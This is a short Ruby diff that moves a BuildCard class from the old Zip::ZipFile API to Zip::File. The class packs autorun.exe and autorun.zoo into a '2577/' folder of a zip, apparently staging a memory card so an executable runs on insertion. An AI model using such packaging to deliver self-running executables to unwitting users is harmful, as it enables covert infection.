@@ -46,7 +46,7 @@ class BuildCard < Build
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
       z.file.open('2577/autorun.exe', "wb") { |f| f.write File.open(path('autorun.exe'), 'rb') {|f| f.read} }
       z.file.open('2577/autorun.zoo', "wb") { |f| f.write File.open(path('autorun.zoo'), 'rb') {|f| f.read} }
     end
